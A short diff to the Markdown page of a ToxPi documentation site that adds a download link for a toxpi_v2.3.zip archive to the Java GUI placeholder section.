@@ -21,7 +21,7 @@ layout: default
 
 - ## ToxPi Java GUI
 
-> Placeholder to discuss Java GUI
+> Placeholder to discuss Java GUI [toxpi_v2.3.zip](https://github.com/user-attachments/files/21943523/toxpi_v2.3.zip)
 
 - ## ToxPi\*GIS
 
